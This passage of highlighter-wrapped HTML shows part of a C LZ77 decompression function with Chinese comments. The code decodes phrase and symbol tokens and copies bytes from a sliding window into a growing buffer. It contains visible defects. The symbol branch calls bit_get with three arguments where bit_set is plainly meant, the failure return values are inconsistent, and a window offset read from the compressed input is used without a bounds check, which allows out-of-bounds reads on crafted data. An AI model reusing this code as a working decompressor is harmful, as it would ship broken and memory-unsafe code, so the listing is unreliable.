class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-212\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-213\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_WINOFF_BITS</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-214\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-215\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">*</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_WINOFF_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-216\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">bit_set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-217\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-218\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-219\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-220\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">memset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-221\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_BUFLEN_BITS</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-222\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-223\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">*</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_BUFLEN_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-224\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">bit_set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-225\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-226\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-227\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-228\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">next</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x00</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-229\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_NEXT_BITS</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-230\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-231\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">*</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_NEXT_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-232\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">bit_set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-233\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-234\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-235\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-236\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*确保偏移和长度对系统有正确的字节排序*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-237\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ntohl</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-238\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ntohl</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-239\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-240\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*将短语从滑动窗口写入原始数据缓冲区*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-241\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-242\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-243\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-244\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">temp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">realloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">length</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-245\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-246\"><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">free</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-247\"><span class=\"crayon-h\">                    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-248\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-249\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">orig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-250\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-251\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">else</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-252\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-253\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">malloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">length</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-254\"><span class=\"crayon-h\">                    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-255\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-256\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-257\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-258\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-259\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-260\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-261\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">/*在前向缓冲区中记录每个符号，直到准备更新滑动窗口*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-262\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-263\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-264\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-265\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">/*调整剩余符号总数*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-266\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-267\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-268\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-269\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*将不匹配的符号写入原始数据缓冲区*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-270\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-271\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-272\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-273\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-274\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-275\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">/*仍需在前向缓冲区中记录此符号*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-276\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-277\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-278\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">/*调整剩余字符总数*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-279\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-280\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-281\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*调整短语长度*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-282\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">length</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-283\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-284\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">else</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-285\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-286\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*处理的是字符标记*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-287\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">next</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x00</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-288\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_NEXT_BITS</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-289\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-290\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">*</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_NEXT_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-291\"><span class=\"crayon-h\">                </span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">bit_get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-292\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-293\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-294\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-295\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*将字符写入原始数据缓冲区*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-296\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">opos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-297\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-298\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">temp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">realloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-299\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-300\"><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">free</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-301\"><span class=\"crayon-h\">                    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-302\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" 